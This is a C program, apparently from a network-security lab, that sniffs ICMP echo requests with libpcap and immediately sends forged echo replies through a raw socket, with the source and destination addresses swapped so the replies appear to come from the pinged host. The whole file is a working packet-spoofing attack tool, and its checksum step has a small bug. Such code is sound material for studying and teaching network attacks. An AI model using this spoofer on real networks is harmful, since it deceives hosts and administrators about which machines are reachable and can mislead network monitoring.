#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <pcap.h>
#include <unistd.h>

unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   return (unsigned short)(~sum);
}

void send_raw_ip_packet(struct ip* ip)
{
   struct sockaddr_in dest_info;
   int enable = 1;

   int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

   if (sock == -1)
   {
      perror("socket");
      exit(1);
   }

   if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) == -1)
   {
      perror("setsockopt");
      exit(1);
   }

   dest_info.sin_family = AF_INET;
   dest_info.sin_addr = ip->ip_dst;

   if (sendto(sock, ip, ntohs(ip->ip_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) == -1)
   {
      perror("sendto");
      exit(1);
   }

   close(sock);
}


void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	/* declare pointers to packet headers */
	const struct ip *ip = (struct ip*)(packet + sizeof(struct ethhdr)); /* The IP header */
	const struct icmphdr *icmp = (struct icmphdr*)(packet + sizeof(struct ethhdr) + ip->ip_hl*4); /* The ICMP header */

    if (icmp->type!=ICMP_ECHO)
        return;

    printf("packet sniffed\n");
    char buff[1500];
    bzero(buff, sizeof(buff));

    memcpy(buff, (packet+sizeof(struct ethhdr)), header->len - sizeof(struct ethhdr));

    struct ip* spoofed_ip = (struct ip*)(buff);
    struct icmphdr *spoofed_icmp = (struct icmphdr*)(buff + ip->ip_hl*4);

    spoofed_ip->ip_src = ip->ip_dst;
    spoofed_ip->ip_dst = ip->ip_src;

    spoofed_icmp->type = ICMP_ECHOREPLY;

    spoofed_icmp->checksum = 0;
    spoofed_icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr));

    send_raw_ip_packet(spoofed_ip);
    printf("packet spoofed\n");
}

int main(int argc, char **argv)
{

	char *dev = NULL;			/* capture device name */
	char *deff = "any";
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "icmp";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */


	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}

	else if (argc > 2)
	{
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		exit(EXIT_FAILURE);
	}

	else
	{
		dev = deff;
	}

	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	 handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	 if (handle == NULL) {
	 	fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
	 	exit(EXIT_FAILURE);
	 }

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, -1, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

	return 0;
}

